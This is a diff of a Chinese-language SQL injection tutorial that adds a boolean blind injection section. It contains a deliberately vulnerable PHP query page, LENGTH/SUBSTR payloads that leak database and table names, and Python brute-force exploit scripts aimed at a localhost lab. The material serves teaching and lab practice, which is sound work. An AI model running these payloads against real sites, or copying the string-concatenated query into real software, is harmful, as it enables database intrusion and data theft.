@@ -1,6 +1,6 @@
 # SQL注入详解
 
-`更新时间 2025-9-5`
+`更新时间 2025-9-7`
 
 ## 概述
 
@@ -523,9 +523,391 @@ echo "用户: " . $row['username'] . "<br>";
 
 #### SQL盲注
 
-大多数实际的查询页面中，不会在前端显示报错信息，这会导致我们无法根据报错来判断注入点、回显点、字段数量等。但聪明的攻击者并不会因此放弃攻击，而是选择不需要查看报错的攻击方式，即SQL盲注。SQL盲注并不依靠数据库本身的报错信息，而是根据前端服务器的响应来判断`payload`的执行情况
+大多数实际的查询页面中，不会在前端显示报错信息，这会导致我们无法根据报错来判断注入点、回显点、字段数量等。但聪明的攻击者并不会因此放弃攻击，而是选择不需要查看报错的攻击方式，即SQL盲注。SQL盲注并不依靠数据库本身的报错信息，而是根据前端页面的响应来判断`payload`的执行情况
 
-SQL盲注主要
+SQL盲注根据使用函数的不同，分为`布尔盲注`与`时间盲注`两种
 
 ##### 布尔盲注
 
+布尔盲注是指依靠`LENGTH()`、`SUBSTR()`、`ASCII()`等字符串函数，通过前端响应的不同，来判断函数是否成功执行，从而猜测数据库敏感内容的注入方式
+
+首先来认识一下布尔盲注通常使用的函数
+
+| 函数     | 使用方法                       | 参数                                                         | 含义                                             |
+| -------- | ------------------------------ | ------------------------------------------------------------ | ------------------------------------------------ |
+| LENGTH() | LENGTH(str)                    | str：查询内容                                                | 返回str的字符长度                                |
+| SUBSTR() | SUBSTR(str, start_pos, length) | str：查询内容<br />start_pos：开始位置（基于查询内容），从1开始<br />length：需要截取的长度 | 从str中，从start_pos开始，截取length长度的字符串 |
+| ASCII()  | ASCII(char)                    | char：查询内容，只能是一个字符                               | 返回char的ASCII编码                              |
+
+然后我们开始进行布尔盲注，假设数据库中有一张数据表
+
+`users`
+
+| id   | username | password |
+| ---- | -------- | -------- |
+| 1    | admin    | admin    |
+| 2    | root     | root     |
+| 3    | kiiz     | xunlin   |
+| 4    | ocean    | mingxi   |
+
+还有一个查询页面
+
+`blind.php`
+
+```php
+<!doctype html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+<h2>用户查询</h2>
+<form method="post" action="blind.php">
+    用户名：
+    <input type="text" name="username">
+    <input type="submit" value="查询">
+</form>
+</body>
+</html>
+
+<?php
+error_reporting(0);
+
+if (isset($_POST['username'])) {
+    $username = $_POST['username'];
+    $conn = new mysqli("localhost", "root", "root", "test");
+    $sql = "SELECT * FROM users WHERE username = '$username'";
+    if (!$conn->query($sql)) {
+        echo "输入的用户名不存在";
+        exit;
+    }
+    $result = $conn->query($sql);
+    if ($result->num_rows == 0) {
+        echo "输入的用户名不存在";
+        exit;
+    }
+    # 只显示一条结果
+    $row = $result->fetch_assoc();
+    echo "id: " . $row['id'] . "<br>";
+    echo "用户: " . $row['username'] . "<br>";
+}
+```
+
+这道题将所有的报错全部关闭了，取而代之的是`"输入的用户名不存在"`一句话
+
+> <img src="./img3/{9557A06C-4E24-43CF-90C2-284310A5DE1F}.png">
+
+###### 判断漏洞类型
+
+在先前的基本漏洞类型中，给出的判断方式有四点，而布尔盲注的判断方式也基本相同，仅是无法判断后台是报错还是无数据
+
+- 尝试`1'`或`1"`没有结果
+- 尝试`1'#`或`1"#`查询结果与`1`相同
+- 尝试`1' AND 1=1#`或`1" AND 1=1#`查询结果与`1`相同
+- 尝试`1' AND 1=2#`或`1" AND 1=2#`没有结果
+
+下面我们使用上方的例子来判断漏洞类型，首先输入`1`，保证有数据结果
+
+> <img src="./img3/{002FE5B1-9FC4-44E9-90B0-277630F30527}.png">
+
+然后输入`1'`，提示`输入的用户名不存在`
+
+> <img src="./img3/{6CDF33E0-7EE4-4D8A-BB59-036960D748F5}.png">
+
+再输入`1'#`，发现结果与`1`相同
+
+> <img src="./img3/{A4B5EDCC-99A4-4372-B131-70DBD68ECB13}.png">
+
+到这里就可以确定是单引号注入类型，我们传入的`'`将后台本身存在的前引号闭合，`#`将后台本身存在的后引号注释掉，就构成了语法正确的SQL语句
+
+###### 判断字段数量
+
+判断字段数量的方式也与之前相同
+
+输入`1' ORDER BY 5#`，提示`输入的用户名不存在`
+
+> <img src="./img3/{33D39AC1-FBFE-452F-90B0-95671C44485F}.png">
+
+输入`1' ORDER BY 3#`，返回内容与`1`相同
+
+> <img src="./img3/{0AF37A70-6454-4A21-8198-84BC8B1546EA}.png">
+
+由此可见，布尔盲注的实质是攻击者将注意力重心放在“返回结果是否变化”上，而非先前注重“是否报错”，这与布尔值本身类似，我们将返回正常内容视为`TRUE`，返回异常内容或无返回内容视为`FALSE`，因此被称为`布尔盲注`
+
+###### 泄露数据库
+
+实际上，这道题除了没有报错信息外，其他地方都与普通注入相同，无法完全体现布尔盲注的特点，因此我们在题目中添加一个过滤，禁用`UNION`关键字
+
+`blind.php`
+
+```php
+<!doctype html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+<h2>用户查询</h2>
+<form method="post" action="blind.php">
+    用户名：
+    <input type="text" name="username">
+    <input type="submit" value="查询">
+</form>
+</body>
+</html>
+
+<?php
+error_reporting(0);
+
+if (isset($_POST['username'])) {
+    $username = $_POST['username'];
+    if (preg_match('/union/i', $username)) {
+        echo "输入的用户名不存在";
+        exit;
+    }
+    $conn = new mysqli("localhost", "root", "root", "test");
+    $sql = "SELECT * FROM users WHERE username = '$username'";
+    if (!$conn->query($sql)) {
+        echo "输入的用户名不存在";
+        exit;
+    }
+    $result = $conn->query($sql);
+    if ($result->num_rows == 0) {
+        echo "输入的用户名不存在";
+        exit;
+    }
+    # 只显示一条结果
+    $row = $result->fetch_assoc();
+    echo "id: " . $row['id'] . "<br>";
+    echo "用户: " . $row['username'] . "<br>";
+}
+```
+
+这里使用`preg_match()`函数对`UNION`关键字进行了过滤，并且因为使用的是正则表达式`/union/i`，会自动忽略大小写，因此可以保证匹配无法绕过
+
+```sql
+1' UnIOn SELECT 1,2,3#
+```
+
+> <img src="./img3/{1A70BC69-9570-4893-A89B-DCCFBD5E134F}.png">
+
+现在我们来正式进行注入，根据以往经验，现在要输入的payload为
+
+```sql
+1' UNION SELECT DATABASE(),2,3#
+```
+
+由于`UNION`被过滤，只能使用其他方式。根据已知的函数`LENGTH()`，它能否返回一个查询结果的长度，如果我们在它的后面使用比较符`>`、`<`和`=`，就能精确判断该查询结果的长度，例如我们判断当前数据库名的长度
+
+> <img src="./img3/{E34FD92B-E53E-46F4-BDC4-B9F8EF3FE0F4}.png">
+
+很显然，在`SELECT LENGTH(DATABASE())=4;`时SQL返回`TRUE`，因此该数据库名的长度为4，所以借助这个特性，我们使用`AND`将正常的查询结果与`LENGTH()`拼接，如果`LENGTH()`返回`TRUE`，最终前端返回的结果就为`AND`前面查询的正常结果，如果`LENGTH()`返回`FALSE`，`AND`运算结果也为`FALSE`，最终前端显示查询失败
+
+```sql
+1' AND LENGTH(DATABASE())>5#
+```
+
+> <img src="./img3/{A32A8775-13C1-4409-957E-275EF483BDFF}.png">
+
+```sql
+1' AND LENGTH(DATABASE())=4#
+```
+
+> <img src="./img3/{23315684-712F-413F-8766-30EBF091753A}.png">
+
+*注：这里可以使用 `>=` 和 `<=`*
+
+现在我们已经知道了数据库名的长度，接下来是泄露数据名的内容，这里就要利用`SUBSTR()`函数了，与`LENGTH()`类似，如果我们在其后面使用比较符，就能够作为一个判断语句使用
+
+> <img src="./img3/{8B29F583-39AD-4B14-9999-E2B0D3B1B9A3}.png">
+
+如上图所示，`SELECT SUBSTR(DATABASE(),1,1)>'u';`为`FALSE`，`SELECT SUBSTR(DATABASE(),1,1)>'p';`为`TRUE`，因此就可以确定数据库名的第一个字符位于`p`和`u`之间，因为尝试的次数比较多，可以使用二分法加快查询效率
+
+> <img src="./img3/{ED078396-E7FF-4857-8BA0-0A728CACD9AB}.png">
+
+最终我们就能得知数据库名的第一个字符是`t`，而第二个字符仅需要修改`SUBSTR()`的第二参数`start_pos`即可
+
+> <img src="./img3/{787E7A9E-2077-437E-AD38-4E96EA219696}.png">
+
+然后，我们同样使用`AND`来拼接正常查询的内容，通过是否返回正常数据来判断`AND`后面拼接的`SUBSTR()`是否返回`TRUE`
+
+```sql
+1' AND SUBSTR(DATABASE(),1,1)>'q'#
+```
+
+> <img src="./img3/{4CD8F78C-4CF6-414C-BC92-9B33050E7BD8}.png">
+
+```sql
+1' AND SUBSTR(DATABASE(),1,1)>'v'#
+```
+
+> <img src="./img3/{DA56FB33-4A30-4D71-BEC7-18F69CD10DAB}.png">
+
+```sql
+1' AND SUBSTR(DATABASE(),1,1)='t'#
+```
+
+> <img src="./img3/{DBF4FF73-79A3-4E92-9CFF-2FFCE93AF361}.png">
+
+以此类推，就可以得到当前的数据库名
+
+**脚本注入**
+
+在进行盲注的时候经常会进行重复的工作，因此可以写一个注入脚本来帮助我们进行攻击，这里我们使用python写一个泄露数据库名的脚本
+
+- 获取请求包
+
+在开始编写脚本之前，我们首先需要知道前端向后端发送的请求包的格式，以及传入的参数，这可以使用抓包来获取
+
+> <img src="./img3/{639025F3-EDAD-4376-8FC1-E6079DC80A56}.png">
+
+观察这个请求包，可以得知使用的是`POST`请求方式，请求的`url`是`localhost/sql-injection/blind.php`，请求体中的参数名为`username`。知道这些信息，我们就能着手编写注入脚本了
+
+- 编写脚本
+
+首先指定攻击的`url`为`http://localhost/sql-injection/blind.php`
+
+```py
+# python
+
+url = 'http://localhost/sql-injection/blind.php'
+```
+
+然后是定义一些需要的变量，如数据库名的长度，字符集，注意这里需要导入`string`包
+
+```py
+import string
+
+length = 4
+charset = string.ascii_letters + string.digits
+```
+
+然后就可以构建payload
+
+```py
+for i in range(1, length + 1):
+    for char in charset:
+        payload = f"1' AND SUBSTR(DATABASE(),{i},1)='{char}'#"
+```
+
+最后根据响应体中是否包含`输入的用户名不存在`这句话来判断是否注入成功
+
+```py
+import requests
+
+response = requests.post(url, data={'username': payload})
+if not '输入的用户名不存在' in response.text:
+    print(f'第{i}个字符是{char}')
+```
+
+最终的exp
+
+```py
+import string
+import requests
+
+# 攻击的url
+url = 'http://localhost/sql-injection/blind.php'
+# 数据库名长度
+length = 4
+# 字符集
+charset = string.ascii_letters + string.digits
+
+for i in range(1, length + 1):
+    for char in charset:
+        payload = f"1' AND SUBSTR(DATABASE(),{i},1)='{char}'#"
+        response = requests.post(url, data={'username': payload})
+        if not '输入的用户名不存在' in response.text:
+            print(f'第{i}个字符是{char}')
+```
+
+由于字符集中包含大小写字母，而数据库名对大小写不敏感，因此结果中会同时出现大小写字母
+
+> <img src="./img3/{3936DA30-6453-4F84-B851-AF2C587AC938}.png">
+
+*解决方法也很简单，这里留给读者自己解决*
+
+###### 泄露数据表
+
+泄露数据表的步骤与泄露数据库相同，只需要将`SUBSTR()`函数的第一个参数改为一个查询语句即可
+
+> <img src="./img3/{DDA53F61-46B9-4F36-A987-6204C3A4A675}.png">
+
+在这道题中，`SUBSTR()`中使用的查询语句即为普通注入时的查询语句，即
+
+```sql
+SELECT SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1);
+```
+
+> <img src="./img3/{046EB1F8-0351-426E-A528-43D5FDD10599}.png">
+
+现在我们在题目中实际注入
+
+```sql
+1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'a'#
+```
+
+> <img src="./img3/{EB389ED6-D5F8-49FF-AB2E-B8C5B93335EF}.png">
+
+```sql
+1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)>'g'#
+```
+
+> <img src="./img3/{84A7C639-3888-4079-B43E-148D24DC7028}.png">
+
+```sql
+1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),1,1)='f'#
+```
+
+> <img src="./img3/{36B2711F-1B90-4A78-8E97-AFBB0B6DCF8A}.png">
+
+最后我们就能得知`test`数据库中某一张表名的第一个字符为`f`
+
+**脚本注入**
+
+同样地，我们利用脚本来进行注入攻击，只需要将刚才的脚本稍作修改，就能够继续使用
+
+```py
+import string
+import requests
+
+# 攻击的url
+url = 'http://localhost/sql-injection/blind.php'
+# 字符集
+# 包含小写字母、数字、特殊字符
+charset = string.ascii_lowercase + string.digits + string.punctuation
+# 最大数据长度
+max_len = 50
+# 定义数据库名
+table_name = ''
+
+for i in range(1, max_len + 1):
+    for char in charset:
+        print(f'正在第{i}次尝试字符{char}')
+        payload = f"1' AND SUBSTR((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()),{i},1)='{char}'#"
+        response = requests.post(url, data={'username': payload})
+        if not '输入的用户名不存在' in response.text:
+            table_name += char
+
+print(table_name)
+```
+
+这里的最大数据长度最好事先使用`LENGTH()`进行判断
+
+```sql
+SELECT LENGTH((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()));
+```
+
+> <img src="./img3/{79A62398-6324-4199-8AF7-CB29A50913A0}.png">
+
+然后使用脚本爆破
+
+> <img src="./img3/{793E46AA-F6A3-4DC3-BFEF-5F30DCBB9C5D}.png">
